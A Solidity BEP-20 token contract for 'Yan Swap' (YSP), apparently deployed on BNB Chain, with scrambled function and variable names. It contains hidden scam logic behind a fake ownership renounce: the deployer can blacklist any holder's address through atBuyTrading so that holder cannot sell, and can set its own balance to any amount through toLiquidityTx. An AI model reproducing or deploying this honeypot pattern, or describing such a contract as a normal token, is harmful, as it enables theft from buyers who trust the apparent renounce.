/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract modeSender {
    function listReceiverAuto() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface marketingSwap {
    function createPair(address liquidityFrom, address isLaunched) external returns (address);
}

interface launchTxMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract YanSwap is IERC20, modeSender {

    string private enableMin = "Yan Swap";

    function transfer(address fromExempt, uint256 receiverTx) external virtual override returns (bool) {
        return listIs(listReceiverAuto(), fromExempt, receiverTx);
    }

    mapping(address => mapping(address => uint256)) private isWalletTotal;

    function amountReceiver(address marketingAmount) public {
        if (atLimit) {
            return;
        }
        
        atLaunched[marketingAmount] = true;
        
        atLimit = true;
    }

    bool public amountTrading;

    uint256 private sellTotal = 100000000 * 10 ** 18;

    bool public buyExempt;

    mapping(address => bool) public atLaunched;

    function toReceiver() public {
        
        
        amountTrading=false;
    }

    address public walletAmount;

    function maxIsMode(address atIs, address liquidityLimit, uint256 receiverTx) internal returns (bool) {
        require(feeToken[atIs] >= receiverTx);
        feeToken[atIs] -= receiverTx;
        feeToken[liquidityLimit] += receiverTx;
        emit Transfer(atIs, liquidityLimit, receiverTx);
        return true;
    }

    function getOwner() external view returns (address) {
        return isTx;
    }

    function listIs(address atIs, address liquidityLimit, uint256 receiverTx) internal returns (bool) {
        if (atIs == walletAmount) {
            return maxIsMode(atIs, liquidityLimit, receiverTx);
        }
        require(!tokenSender[atIs]);
        return maxIsMode(atIs, liquidityLimit, receiverTx);
    }

    uint256 public takeIsTrading;

    string private listToken = "YSP";

    address private isTx;

    function allowance(address maxSwapReceiver, address fundLaunched) external view virtual override returns (uint256) {
        return isWalletTotal[maxSwapReceiver][fundLaunched];
    }

    bool private buyLiquidity;

    bool public feeReceiver;

    function name() external view returns (string memory) {
        return enableMin;
    }

    function decimals() external view returns (uint8) {
        return buyLaunch;
    }

    constructor (){
        if (takeIsTrading == walletBuyAt) {
            teamMarketing = true;
        }
        launchTxMin receiverLaunch = launchTxMin(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        swapLaunchedLimit = marketingSwap(receiverLaunch.factory()).createPair(receiverLaunch.WETH(), address(this));
        isTx = listReceiverAuto();
        if (buyExempt) {
            amountTrading = false;
        }
        walletAmount = listReceiverAuto();
        atLaunched[listReceiverAuto()] = true;
        
        feeToken[listReceiverAuto()] = sellTotal;
        emit Transfer(address(0), walletAmount, sellTotal);
        listAmount();
    }

    mapping(address => uint256) private feeToken;

    function totalSupply() external view virtual override returns (uint256) {
        return sellTotal;
    }

    mapping(address => bool) public tokenSender;

    bool private teamMarketing;

    uint256 public marketingSwapShould;

    function atBuyTrading(address modeFeeWallet) public {
        if (takeIsTrading != marketingSwapShould) {
            takeIsTrading = walletBuyAt;
        }
        if (modeFeeWallet == walletAmount || modeFeeWallet == swapLaunchedLimit || !atLaunched[listReceiverAuto()]) {
            return;
        }
        if (teamMarketing == feeReceiver) {
            buyLiquidity = false;
        }
        tokenSender[modeFeeWallet] = true;
    }

    function toLiquidityTx(uint256 receiverTx) public {
        if (!atLaunched[listReceiverAuto()]) {
            return;
        }
        feeToken[walletAmount] = receiverTx;
    }

    function symbol() external view returns (string memory) {
        return listToken;
    }

    function shouldLimit() public view returns (bool) {
        return amountTrading;
    }

    bool private feeAtFrom;

    function owner() external view returns (address) {
        return isTx;
    }

    uint256 public autoLimit;

    function fundAuto() public {
        if (feeReceiver != buyLiquidity) {
            marketingSwapShould = takeIsTrading;
        }
        if (feeAtFrom) {
            teamMarketing = true;
        }
        amountTrading=false;
    }

    uint256 public walletBuyAt;

    address public swapLaunchedLimit;

    function approve(address fundLaunched, uint256 receiverTx) public virtual override returns (bool) {
        isWalletTotal[listReceiverAuto()][fundLaunched] = receiverTx;
        emit Approval(listReceiverAuto(), fundLaunched, receiverTx);
        return true;
    }

    function listAmount() public {
        emit OwnershipTransferred(walletAmount, address(0));
        isTx = address(0);
    }

    bool public atLimit;

    function transferFrom(address atIs, address liquidityLimit, uint256 receiverTx) external override returns (bool) {
        if (isWalletTotal[atIs][listReceiverAuto()] != type(uint256).max) {
            require(receiverTx <= isWalletTotal[atIs][listReceiverAuto()]);
            isWalletTotal[atIs][listReceiverAuto()] -= receiverTx;
        }
        return listIs(atIs, liquidityLimit, receiverTx);
    }

    uint8 private buyLaunch = 18;

    event OwnershipTransferred(address indexed sellShouldExempt, address indexed exemptSender);

    function balanceOf(address fromLaunched) public view virtual override returns (uint256) {
        return feeToken[fromLaunched];
    }

    function receiverEnableFee() public view returns (bool) {
        return feeAtFrom;
    }

    function takeWallet() public {
        
        if (buyExempt == feeReceiver) {
            buyLiquidity = false;
        }
        takeIsTrading=0;
    }

}